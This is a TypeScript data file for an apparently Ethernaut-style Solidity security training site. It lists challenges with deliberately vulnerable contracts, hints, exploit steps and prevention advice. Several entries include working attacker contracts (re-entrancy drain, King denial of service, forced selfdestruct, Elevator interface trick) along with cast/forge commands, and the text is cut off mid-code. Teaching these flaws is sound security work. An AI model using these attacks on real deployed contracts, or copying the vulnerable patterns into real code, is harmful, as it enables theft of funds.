
// src/lib/challenges.ts

import type React from 'react'; // Import React type
import type { LucideProps } from 'lucide-react'; // Import LucideProps type
import {
  Undo2, Coins, Phone, CircleDollarSign, GitBranch, Bomb, KeyRound, Crown, Repeat,
  ArrowUpFromLine, EyeOff, Milestone, CircleOff, Archive, HeartHandshake, Wand2, FileCode,
  Ban, ShoppingCart, ArrowRightLeft, Puzzle, ToggleLeft, Workflow, Landmark,
  UserCog, Orbit, HelpingHand, Lock,
  Network, // Icons for challenges
} from 'lucide-react'; // Import specific icons

export interface Challenge {
  slug: string;
  name: string;
  difficulty: 'Warmup' | 'Easy' | 'Medium' | 'Hard' | 'Insane'; // Example difficulties
  description: string; // Brief description or objective
  vulnerableCode: string;
  hints: string[];
  explanation: string; // Markdown content
  icon?: React.FC<LucideProps> | undefined; // Icon for the challenge
  solution?: {
    // Optional: Structured solution steps or code
    code?: string;
    steps?: string[];
  };
  testCases?: {
    // Optional: For mock execution validation
    input: string;
    expectedOutput: boolean | string;
  }[];
}

export const challenges: Challenge[] = [
  {
    slug: 'fallback',
    name: 'Fallback',
    difficulty: 'Warmup',
    description: 'Claim ownership of the contract and reduce its balance to 0.',
    vulnerableCode: "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport '@openzeppelin/contracts/utils/math/SafeMath.sol';\n\ncontract Fallback {\n\n  using SafeMath for uint256;\n  mapping(address => uint) public contributions;\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  }\n\n  modifier onlyOwner {\n     require(\n        msg.sender == owner,\n        \"caller is not the owner\"\n     );\n     _;\n  }\n\n  function contribute() public payable {\n    require(msg.value < 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) {\n      owner = msg.sender;\n    }\n  }\n\n  function getContribution() public view returns (uint) {\n    return contributions[msg.sender];\n  }\n\n  function withdraw() public onlyOwner {\n    payable(owner).transfer(address(this).balance);\n  }\n\n  receive() external payable {\n    require(msg.value > 0 && contributions[msg.sender] > 0);\n    owner = msg.sender;\n  }\n}",
    hints: [
      'Look into the difference between `fallback()` and `receive()` functions.',
      'How can you become the owner?',
      'You will need to send ether to the contract both when contributing and when triggering the fallback.',
    ],
    explanation: "### Vulnerability\nThe contract has two ways to receive Ether: the `contribute()` function and the `receive()` fallback function.\n\n1.  **`contribute()`:** Requires a contribution less than 0.001 ether. It increases the sender's contribution count. If the sender's total contribution exceeds the owner's, the sender becomes the new owner. However, the owner starts with 1000 ether, making it practically impossible to become owner this way.\n2.  **`receive()`:** This function is triggered when Ether is sent to the contract *without* any data (`msg.data` is empty). Crucially, it has two conditions:\n    *   `msg.value > 0`: Ether must be sent.\n    *   `contributions[msg.sender] > 0`: The sender must have previously contributed *something* via the `contribute()` function.\n    If both conditions are met, the sender immediately becomes the owner (`owner = msg.sender;`).\n\nThe vulnerability lies in the fact that anyone who has made even a tiny contribution can become the owner by simply sending more Ether to the contract without calling any specific function (triggering `receive()`).\n\n### Exploit Steps\n1.  **Call `contribute()`**: Send a small amount of Ether (less than 0.001 ether) by calling the `contribute()` function. This satisfies the `contributions[msg.sender] > 0` requirement for the `receive()` function.\n2.  **Send Ether to the Contract**: Send any amount of Ether (e.g., 1 wei) directly to the contract address *without* calling any function (i.e., empty `msg.data`). This triggers the `receive()` function.\n3.  **Become Owner**: Since `msg.value > 0` and `contributions[msg.sender] > 0` are now both true, the line `owner = msg.sender;` executes, making you the owner.\n4.  **Withdraw Funds**: Call the `withdraw()` function. Since you are now the owner, this function will transfer the entire contract balance to your address.\n\n### Prevention\n*   **Explicit Access Control**: Ensure functions that change critical state like ownership (`receive()` in this case) have proper access control (e.g., an `onlyOwner` modifier or similar checks). The `receive()` function should likely not change ownership at all.\n*   **Least Privilege**: Design contracts so that functions have only the permissions necessary to perform their task. The ability to receive Ether shouldn't automatically grant ownership.\n*   **Be Wary of Fallbacks**: Understand the conditions under which `fallback()` and `receive()` are triggered and ensure they don't contain unintended side effects or state changes.\n",
    icon: Undo2,
    // We can add solution code and test cases later
  },
  {
    slug: 'coin-flip',
    name: 'Coin Flip',
    icon: Coins,
    difficulty: 'Easy',
    description: 'Guess the outcome of a coin flip 10 times in a row.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}`,
    hints: [
      'How is the "random" number generated for the coin flip?',
      'Is the source of randomness truly unpredictable from outside the contract?',
      'Can another contract predict the outcome of `blockhash(block.number - 1)`?',
    ],
    explanation: `
### Vulnerability
The contract attempts to create randomness using \`blockhash(block.number - 1)\`. However, blockchain data, including block hashes, is public and deterministic. A key misunderstanding is that \`block.number - 1\` refers to the *previous* block *at the time of execution*.

An attacker can create a separate contract that reads the exact same \`blockhash(block.number - 1)\` value *within the same transaction* that calls the \`flip\` function. Since both contracts are running in the same transaction context, they see the same block data. The attacker's contract can calculate the \`coinFlip\` result *before* calling the target \`CoinFlip\` contract's \`flip\` function, thus knowing the correct guess beforehand.

### Exploit Steps
1.  **Create an Attacker Contract**: Deploy a contract with a function (e.g., \`attackFlip\`) that takes the \`CoinFlip\` contract address as an argument.
2.  **Predict the Outcome**: Inside \`attackFlip\`, calculate the \`blockValue = uint256(blockhash(block.number - 1))\` and the resulting \`coinFlip = blockValue / FACTOR\`. Determine the correct \`_guess\` based on this calculation.
3.  **Call \`flip\`**: Have the \`attackFlip\` function call the target \`CoinFlip\` contract's \`flip\` function with the predicted \`_guess\`.
4.  **Repeat**: Call the \`attackFlip\` function 10 times. Each call will correctly predict the outcome, leading to 10 consecutive wins.

### Prevention
*   **Avoid On-Chain Randomness Sources**: Do not use block variables (\`blockhash\`, \`block.timestamp\`, \`block.difficulty\`, etc.) or transaction properties as sources of randomness for security-critical applications. They are predictable or manipulable.
*   **Use Oracles**: For true randomness, use a trusted oracle service (like Chainlink VRF - Verifiable Random Function) that provides verifiable random numbers generated off-chain.
*   **Commit-Reveal Schemes**: For simpler cases (not ideal for gambling), a commit-reveal scheme can be used, where users commit to a hash of their choice plus a secret nonce, and later reveal the nonce. This prevents miners from manipulating outcomes but doesn't provide true randomness against determined attackers.
`,
  },
  {
    slug: 'telephone',
    name: 'Telephone',
    difficulty: 'Easy',
    description: 'Claim ownership of the Telephone contract.',
    icon: Phone,
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _newOwner) public {
    if (tx.origin != msg.sender) {
      owner = _newOwner;
    }
  }
}`,
    hints: [
      'What is the difference between `tx.origin` and `msg.sender`?',
      'How does the check `tx.origin != msg.sender` prevent the direct caller from changing the owner?',
      'Can you use an intermediate contract to call `changeOwner`?',
    ],
    explanation: `
### Vulnerability
The \`changeOwner\` function uses \`tx.origin != msg.sender\` to try and prevent the direct caller (EOA - Externally Owned Account) from changing the owner.

*   **\`msg.sender\`**: The immediate caller of the current function. If User A calls Contract B, and Contract B calls Contract C, then within Contract C, \`msg.sender\` is Contract B's address.
*   **\`tx.origin\`**: The original EOA that initiated the entire transaction chain. In the example above, within Contract C, \`tx.origin\` is User A's address.

The check \`tx.origin != msg.sender\` is only true if the function is called by *another contract*. If an EOA calls \`changeOwner\` directly, \`tx.origin\` will be equal to \`msg.sender\`, and the ownership change will fail.

The vulnerability is that an attacker can deploy an intermediary contract. The attacker (EOA) calls their intermediary contract, which then calls the \`Telephone\` contract's \`changeOwner\` function.

Inside \`Telephone.changeOwner\`:
*   \`msg.sender\` will be the address of the attacker's intermediary contract.
*   \`tx.origin\` will be the address of the attacker (EOA).

Since \`tx.origin\` (attacker EOA) is not equal to \`msg.sender\` (attacker's contract), the condition \`tx.origin != msg.sender\` becomes true, and the attacker can set the owner to their own address (or any address they pass).

### Exploit Steps
1.  **Create an Attacker Contract**: Deploy a contract (e.g., \`TelephoneAttacker\`) with a function (e.g., \`attack\`) that takes the \`Telephone\` contract address and the desired new owner address (\_attackerAddress) as arguments.
2.  **Implement the Call**: Inside the \`attack\` function, simply call \`telephoneContract.changeOwner(_attackerAddress);\`.
3.  **Execute the Attack**: Call the \`attack\` function of your deployed \`TelephoneAttacker\` contract, passing in the address of the target \`Telephone\` contract and your own EOA address as the \`_newOwner\`.
4.  **Verify Ownership**: Check the \`owner\` variable of the \`Telephone\` contract; it should now be your EOA address.

### Prevention
*   **Avoid \`tx.origin\` for Authorization**: Never use \`tx.origin\` for authorization checks. It's generally unsafe and can lead to phishing-like attacks if users are tricked into calling malicious contracts. Always use \`msg.sender\` to identify the immediate caller for authorization purposes.
`,
  },
  {
    slug: 'token',
    name: 'Token',
    icon: CircleDollarSign,
    difficulty: 'Easy',
    description: 'Start with 20 tokens and end up with a large amount, exploiting an underflow vulnerability.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) {
    totalSupply = _initialSupply;
    balances[msg.sender] = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // Vulnerable line
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}`,
    hints: [
      'What happens if you try to subtract a larger number from a smaller number with unsigned integers (uint)?',
      'Consider the line `require(balances[msg.sender] - _value >= 0);` when `_value` is greater than `balances[msg.sender]`.',
      'How does Solidity handle integer underflow/overflow by default in versions before 0.8.0 (or without SafeMath)? Note: This code uses ^0.8.0, which has built-in checks!',
      'Okay, the ^0.8.0 check makes the *hint* slightly misleading for direct underflow. Re-read the requirement: `require(balances[msg.sender] - _value >= 0)`. What happens if `balances[msg.sender]` is 20 and `_value` is 21 in Solidity ^0.8.0?',
    ],
    explanation: `
### Vulnerability
This challenge highlights integer underflow, although the context of Solidity versions matters greatly.

**Historical Context (Solidity < 0.8.0):**
In versions *before* 0.8.0, subtracting a larger unsigned integer (\`_value\`) from a smaller one (\`balances[msg.sender]\`) would *underflow*. For example, \`20 - 21\` would wrap around to a very large positive number (\`type(uint).max\`). The check \`require(balances[msg.sender] - _value >= 0);\` would *pass* because the large result of the underflow is indeed greater than or equal to 0. The subsequent lines would then subtract \`_value\` (causing underflow again on the balance) and incorrectly add \`_value\` to the recipient.

**Current Context (Solidity >= 0.8.0):**
Since Solidity 0.8.0, arithmetic operations perform checked math by default. This means that integer underflows (and overflows) will cause a transaction to **revert**.

Therefore, in *this specific contract code* using \`pragma solidity ^0.8.0;\`, the line \`require(balances[msg.sender] - _value >= 0);\` will actually **revert** if you try to transfer more tokens than you have (e.g., transfer 21 when balance is 20). The subtraction \`balances[msg.sender] - _value\` itself will trigger the revert due to the underflow check *before* the \`>= 0\` comparison is even evaluated meaningfully in the old sense.

**The "Trick" (or misunderstanding intended by the original Ethernaut level):**
The original Ethernaut level this is based on likely used an older Solidity version (<0.8.0) where the underflow *would* occur and the \`require\` check would pass erroneously. The exploit relies on this underflow behavior.

If we strictly adhere to the ^0.8.0 pragma, the intended underflow exploit *doesn't work* as described historically. However, the goal is usually to understand the historical vulnerability.

### Exploit Steps (Assuming <0.8.0 behavior for learning)
1.  **Identify Target**: Find an address (\`_to\`) to send tokens to (it can be any address, even one you don't control, or yourself).
2.  **Trigger Underflow**: Call the \`transfer\` function with \`_to\` as the recipient and \`_value\` set to a number greater than your current balance (e.g., if your balance is 20, call \`transfer(someAddress, 21)\`).
3.  **Underflow Occurs**:
    *   The check \`require(balances[msg.sender] - _value >= 0)\` evaluates \`20 - 21\`, which underflows to \`type(uint).max\`. Since \`type(uint).max >= 0\`, the check passes.
    *   \`balances[msg.sender] -= _value;\` underflows your balance to a huge number.
    *   \`balances[_to] += _value;\` increases the recipient's balance.
4.  **Result**: Your balance becomes enormous due to the underflow.

### Exploit Steps (Actual behavior in >=0.8.0)
1.  **Attempt Transfer**: Call \`transfer(someAddress, 21)\` when your balance is 20.
2.  **Transaction Reverts**: The transaction fails and reverts because the subtraction \`20 - 21\` causes an underflow, which is automatically checked and prevented in Solidity 0.8.0+. You cannot gain tokens this way with this specific code and compiler version.

### Prevention
*   **Use SafeMath (if <0.8.0)**: For Solidity versions before 0.8.0, always use the SafeMath library (or equivalent) for all arithmetic operations to prevent overflows and underflows.
*   **Use Solidity >=0.8.0**: Compile with Solidity 0.8.0 or later, as checked arithmetic is the default behavior, preventing these vulnerabilities automatically.
`,
  },
  {
    slug: 'delegation',
    name: 'Delegation',
    icon: GitBranch,
    difficulty: 'Easy',
    description: 'Claim ownership of the `Delegation` contract.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool success,) = address(delegate).delegatecall(msg.data);
    require(success, "delegatecall failed");
  }
}`,
    hints: [
      'Understand how `delegatecall` works and how it affects storage.',
      'How can you interact with the `Delegate` contract\'s logic through the `Delegation` contract?',
      'The `fallback` function is key here. What kind of transaction triggers it?',
      'How do you encode function calls manually?'
    ],
    explanation: `### Vulnerability
The \`Delegation\` contract uses \`delegatecall\` in its \`fallback\` function to forward calls to the \`Delegate\` contract. \`delegatecall\` executes the code of the called contract (\`Delegate\`) within the context of the calling contract (\`Delegation\`). This means that any storage modifications made by the \`Delegate\` contract's code will affect the storage of the \`Delegation\` contract.

The \`Delegate\` contract has a public function \`pwn()\`, which sets its \`owner\` variable to \`msg.sender\`. Because the \`delegatecall\` executes \`pwn()\` in the context of \`Delegation\`, it's the \`owner\` variable in the \`Delegation\` contract's storage that gets modified, not the one in \`Delegate\`.

### Exploit
1.  Craft a transaction targeting the \`Delegation\` contract.
2.  The transaction data should be the function signature of \`pwn()\`. This is calculated as the first 4 bytes of the Keccak-256 hash of the function signature string "pwn()". You can use tools like \`cast sig "pwn()"\` or web3 libraries to get this (\`0xdd365b8b\`).
3.  Send the transaction to the \`Delegation\` contract address with the crafted data (\`0xdd365b8b\`).
4.  Since \`Delegation\` doesn't have a function matching this signature, its \`fallback\` function is triggered.
5.  The \`fallback\` function executes \`address(delegate).delegatecall(msg.data)\`.
6.  This runs the \`pwn()\` function code from \`Delegate\` but modifies the storage of \`Delegation\`.
7.  The \`owner\` state variable in \`Delegation\`'s storage is updated to your address (\`msg.sender\` in the context of the \`delegatecall\`).
8.  You have now claimed ownership of the \`Delegation\` contract.

You can achieve this using tools like Foundry's \`cast\`:
\`cast send <Delegation_Address> "pwn()"\ --private-key <Your_Private_Key>\`
Or web3 libraries by sending a transaction with \`data: '0xdd365b8b'\` to the \`Delegation\` address.`
  },
  {
    slug: 'force',
    name: 'Force',
    icon: Bomb,
    difficulty: 'Easy',
    description: 'Make the balance of the contract greater than zero.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
`,
    hints: [
      'Is there any way to send Ether to a contract even if it doesn\'t have a `receive()` or payable `fallback()` function?',
      'Consider contract destruction and its consequences.',
      'Look up the `selfdestruct` opcode.'
    ],
    explanation: `### Vulnerability
The \`Force\` contract has no \`receive()\` or payable \`fallback()\` function, meaning it's not designed to accept Ether directly via normal transactions (\`send\`, \`transfer\`, \`call\`). However, there are ways to forcibly send Ether to any address, including contracts without payable functions.

One primary method is using \`selfdestruct(recipient)\`. When a contract calls \`selfdestruct\`, its remaining Ether balance is forcibly sent to the specified \`recipient\` address, regardless of whether the recipient contract has code to handle Ether reception.

### Exploit
1.  Create a new helper contract (e.g., \`Attacker\`) in Solidity.
2.  Give the \`Attacker\` contract a function that calls \`selfdestruct(payable(forceContractAddress))\`, where \`forceContractAddress\` is the address of the target \`Force\` instance.
3.  Deploy the \`Attacker\` contract and send some Ether to it (e.g., 1 wei is enough).
4.  Call the function on your deployed \`Attacker\` contract that triggers \`selfdestruct\`.
5.  The Ether held by the \`Attacker\` contract will be forcibly sent to the \`Force\` contract address.
6.  The balance of the \`Force\` contract will now be greater than zero, completing the challenge.

Example Attacker Contract:
\`\`\`solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    address payable forceInstance;

    constructor(address payable _forceInstance) {
        forceInstance = _forceInstance;
    }

    // Send Ether to this contract first!
    receive() external payable {}

    function attack() public {
        selfdestruct(forceInstance);
    }
}
\`\`\`
Deployment and execution steps (using Foundry):
1.  \`forge create Attacker --constructor-args <Force_Instance_Address> --value 0.001ether --private-key <Your_Key>\` (Note the deployed Attacker address)
2.  \`cast send <Attacker_Address> "attack()" --private-key <Your_Key>\`
Verify the balance of the Force contract afterwards.`
  },
  {
    slug: 'vault',
    name: 'Vault',
    icon: KeyRound,
    difficulty: 'Easy',
    description: 'Unlock the vault!',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}`,
    hints: [
      'Is private data truly private on a public blockchain?',
      'How is contract storage structured and accessed?',
      'Can you read the storage slots of a deployed contract?'
    ],
    explanation: `### Vulnerability
All data stored on a public blockchain, including state variables marked as \`private\` in Solidity, is actually publicly accessible. The \`private\` keyword only prevents other contracts from directly accessing the variable, but anyone can read the storage slots of a deployed contract off-chain.

The \`password\` state variable is stored in one of the contract's storage slots. Since we know the layout of state variables (they are stored sequentially starting from slot 0, unless they are packed), we can determine which slot holds the password.

- \`locked\` (bool) is stored in slot 0.
- \`password\` (bytes32) is stored in slot 1.

### Exploit
1.  Identify the address of the deployed \`Vault\` contract instance.
2.  Use a tool (like Web3.js, Ethers.js, Foundry's \`cast\`, or Remix's debugger) to read the contents of storage slot 1 for that contract address.
    -   Using \`cast\`: \`cast storage <Vault_Address> 1\`
    -   Using Ethers.js: \`provider.getStorageAt(vaultAddress, 1)\`
3.  The value returned will be the \`password\` stored as a \`bytes32\` value (hexadecimal string).
4.  Call the \`unlock(bytes32 _password)\` function on the \`Vault\` contract, passing the retrieved password value as the argument.
5.  The contract will compare the provided password with the stored password. Since they match, it will set \`locked\` to \`false\`.
6.  The vault is now unlocked.

Example using \`cast\`:
1.  \`PASSWORD=$(cast storage <Vault_Address> 1)\`
2.  \`cast send <Vault_Address> "unlock(bytes32)" $PASSWORD --private-key <Your_Key>\``
  },
  {
    slug: 'king',
    name: 'King',
    icon: Crown,
    difficulty: 'Easy',
    description: 'Become the king of the contract by preventing others from taking the throne.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}`,
    hints: [
      'What happens if the current king cannot receive Ether?',
      'Contracts can have `receive()` or `fallback()` functions.',
      'What happens if a contract\'s `receive()` function reverts?',
    ],
    explanation: `### Vulnerability
The \`receive()\` function transfers the received Ether (\`msg.value\`) to the current \`king\` using \`payable(king).transfer(msg.value)\`. If the current \`king\` is a contract address that does not have a \`receive()\` or \`fallback()\` function implemented (or if its function reverts upon receiving Ether), the \`transfer()\` call will fail and revert the entire transaction.

### Attack
1.  Deploy a malicious contract (\`MaliciousKingContract\`) that does *not* have a \`receive()\` or \`fallback()\` function (or has one that intentionally reverts).
2.  Call the \`receive()\` function of the \`King\` contract from your \`MaliciousKingContract\`, sending an amount of Ether greater than or equal to the current \`prize\`.
3.  The \`King\` contract will attempt to transfer the sent Ether back to the previous king (which might be another contract or an EOA). This works.
4.  The \`King\` contract will then set the \`king\` state variable to the address of your \`MaliciousKingContract\`.
5.  Now, your \`MaliciousKingContract\` is the king.
6.  Any subsequent attempts by other users to become king by sending Ether to the \`King\` contract will fail. This is because when the \`King\` contract tries to execute \`payable(king).transfer(msg.value)\` (where \`king\` is now your \`MaliciousKingContract\`'s address), the transfer will revert because your contract cannot accept Ether.
7.  Since the transaction reverts, the \`king\` address is never updated, and your \`MaliciousKingContract\` remains the king indefinitely, effectively locking the contract.

### Malicious Contract Example
\`\`\`solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint);
    receive() external payable;
}

contract AttackKing {
    IKing kingContract;

    constructor(address _kingAddress) {
        kingContract = IKing(_kingAddress);
    }

    function attack() public payable {
        // Ensure we send enough Ether to become king
        require(msg.value >= kingContract.prize(), "Not enough Ether sent");
        // Send Ether to the King contract's receive function
        // This contract (AttackKing) becomes the new king
        (bool success, ) = address(kingContract).call{value: msg.value}("");
        require(success, "Failed to call King contract");
    }

    // No receive() or fallback() function implemented,
    // or one that reverts:
    // receive() external payable { revert("I reject Ether!"); }
}
\`\`\`
`,
  },
  {
    slug: 're-entrancy',
    name: 'Re-entrancy',
    icon: Repeat,
    difficulty: 'Medium',
    description: 'Steal all the funds from the contract using a re-entrancy attack.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}(""); // Unchecked external call
      if(result) {
        balances[msg.sender] -= _amount; // State change AFTER external call
      }
    }
  }

  receive() external payable {}
}`,
    hints: [
      'The contract sends Ether using `.call{value:_amount}("")` before updating the balance.',
      'What happens if the recipient (`msg.sender`) is a contract?',
      'Can the recipient contract call back into the `withdraw` function before the original call finishes?',
      'Look up the "Checks-Effects-Interactions" pattern.',
    ],
    explanation: `### Vulnerability
The \`withdraw\` function performs an external call (\`msg.sender.call{value:_amount}("")\`) *before* it updates the user's balance (\`balances[msg.sender] -= _amount\`). This violates the Checks-Effects-Interactions pattern.

If the \`msg.sender\` is a malicious contract, its \`receive()\` or \`fallback()\` function will be executed when it receives the Ether from the \`.call\`. This malicious function can then call the \`withdraw\` function of the \`Reentrance\` contract *again* before the first \`withdraw\` call has finished and updated the balance.

Since the balance hasn't been updated yet, the check \`balances[msg.sender] >= _amount\` will still pass, allowing the malicious contract to withdraw the funds multiple times until the \`Reentrance\` contract's balance is drained.

### Attack
1.  Deploy a malicious contract (\`AttackReentrance\`) with some Ether.
2.  Call the \`donate\` function of the \`Reentrance\` contract from your \`AttackReentrance\` contract, donating some Ether (e.g., 1 Ether) to register your contract's address in the \`balances\` mapping.
3.  Call a function (e.g., \`attack\`) on your \`AttackReentrance\` contract.
4.  The \`attack\` function calls the \`withdraw\` function of the \`Reentrance\` contract, requesting to withdraw the donated amount (1 Ether).
5.  The \`Reentrance\` contract checks the balance (passes) and executes \`msg.sender.call{value:_amount}("")\`, sending 1 Ether to your \`AttackReentrance\` contract.
6.  This triggers the \`receive()\` function in your \`AttackReentrance\` contract.
7.  Inside your \`receive()\` function, immediately call the \`Reentrance.withdraw(_amount)\` function again.
8.  Since the first \`withdraw\` call hasn't updated the balance yet, the check \`balances[msg.sender] >= _amount\` passes again.
9.  The \`Reentrance\` contract sends another 1 Ether to your contract, triggering the \`receive()\` function again.
10. This process repeats (re-enters the \`withdraw\` function) until the \`Reentrance\` contract has no more Ether left to send for the requested \`_amount\`.
11. Eventually, the \`Reentrance\` contract runs out of Ether for the withdrawal amount, the \`.call\` fails or sends 0, the recursive calls unwind, and the balances are finally updated (likely setting the attacker's balance to 0 or a negative number if SafeMath wasn't used). However, the attacker has already drained the contract's funds into their own contract.

### Malicious Contract Example
\`\`\`solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);
}

contract AttackReentrance {
    IReentrance targetContract;
    address owner;
    uint256 amountToSteal; // Store the initial amount we plan to withdraw repeatedly

    constructor(address _targetAddress) {
        targetContract = IReentrance(_targetAddress);
        owner = msg.sender;
    }

    function setAmountToSteal(uint _amount) public {
        require(msg.sender == owner, "Only owner");
        amountToSteal = _amount;
    }

    // Donate some funds first to get registered
    function donateToTarget() public payable {
        targetContract.donate{value: msg.value}(address(this));
    }

    // Start the attack
    function attack() public {
        require(amountToSteal > 0, "Set amountToSteal first");
        targetContract.withdraw(amountToSteal);
    }

    // receive() is called when the target contract sends Ether via .call
    receive() external payable {
        // As long as the target has enough balance for our withdrawal amount, re-enter
        if (address(targetContract).balance >= amountToSteal) {
            targetContract.withdraw(amountToSteal);
        }
        // If the target's balance is less than our desired amount,
        // we stop re-entering and let the execution finish.
    }

    // Function to withdraw funds from this attack contract to the owner
    function withdrawToOwner() public {
        payable(owner).transfer(address(this).balance);
    }
}
\`\`\`

### Mitigation
Use the Checks-Effects-Interactions pattern: Perform all checks first, then update state variables (effects), and only then interact with external contracts. Also, consider using a reentrancy guard modifier (like OpenZeppelin's \`ReentrancyGuard\`).
\`\`\`solidity
function withdraw(uint _amount) public {
  // Check
  require(balances[msg.sender] >= _amount, "Insufficient balance");

  // Effect (update balance BEFORE external call)
  balances[msg.sender] -= _amount;

  // Interaction
  (bool result,) = msg.sender.call{value:_amount}("");
  require(result, "Transfer failed");

  // Note: If the transfer fails, the state change is NOT reverted automatically.
  // You might need more complex logic if you need to handle transfer failures
  // after the state has changed. OpenZeppelin's PullPayment pattern is often safer.
}
\`\`\`
`,
  },
  {
    slug: 'elevator',
    name: 'Elevator',
    icon: ArrowUpFromLine,
    difficulty: 'Easy',
    description: 'Reach the top floor of the building by exploiting the interface.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender); // Treats caller as the Building

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}`,
    hints: [
      'The `Elevator` contract calls the `isLastFloor` function on `msg.sender`.',
      'Can you control what `isLastFloor` returns when called?',
      'How can you make `isLastFloor` return different values in the same transaction?',
    ],
    explanation: `### Vulnerability
The \`Elevator\` contract's \`goTo(uint _floor)\` function interacts with the caller (\`msg.sender\`) by casting it to the \`Building\` interface and calling the \`isLastFloor\` function on it *twice* within the same transaction execution:
1.  Inside the \`if\` condition: \`if (! building.isLastFloor(_floor))\`.
2.  To set the \`top\` variable: \`top = building.isLastFloor(floor)\`.

Crucially, the contract assumes that \`isLastFloor\` will return the same value for the same input within the same transaction. However, if the caller (\`msg.sender\`) is a malicious contract, it can implement the \`isLastFloor\` function to return different values based on some internal state that changes between the two calls.

### Attack
1.  Deploy a malicious contract (\`AttackElevator\`) that implements the \`Building\` interface.
2.  Implement the \`isLastFloor(uint _floor)\` function in your \`AttackElevator\` contract. This function should:
    *   Keep track of whether it has been called once or twice within the current transaction.
    *   On the *first* call within a transaction, return \`false\` (to bypass the \`if (! building.isLastFloor(_floor))\` check).
    *   On the *second* call within the same transaction, return \`true\`.
3.  From your \`AttackElevator\` contract, call the \`Elevator.goTo(uint _floor)\` function, passing any floor number (e.g., 42).
4.  The \`Elevator\` contract calls \`building.isLastFloor(42)\` (where \`building\` is your contract). Your function returns \`false\`.
5.  The \`if\` condition \`!false\` becomes true, so the code inside the \`if\` block executes.
6.  \`floor\` is set to 42.
7.  The \`Elevator\` contract calls \`building.isLastFloor(floor)\` (which is \`building.isLastFloor(42)\`) again to set the \`top\` variable.
8.  This time, your \`isLastFloor\` function recognizes it's the second call in the transaction and returns \`true\`.
9.  The \`top\` variable in the \`Elevator\` contract is set to \`true\`.
10. You have successfully reached the top floor.

### Malicious Contract Example
\`\`\`solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface for the target contract
interface IElevator {
  function goTo(uint _floor) external;
}

// Interface required by the target contract
interface Building {
  function isLastFloor(uint) external returns (bool);
}

// Our malicious contract implementing the Building interface
contract AttackElevator is Building {
  IElevator elevator;
  bool switchState = true; // State to toggle return value
  uint targetFloor = 42; // Arbitrary floor number

  constructor(address _elevatorAddress) {
      elevator = IElevator(_elevatorAddress);
  }

  // Implement the function required by the Building interface
  // This will be called twice by Elevator.goTo()
  function isLastFloor(uint) external override returns (bool) {
    // On first call, return false
    // On second call, return true
    if (switchState) {
      switchState = false; // Flip the switch for the next call
      return false;
    } else {
      switchState = true; // Reset switch for potential future attacks (optional)
      return true;
    }
  }

  // Function to initiate the attack
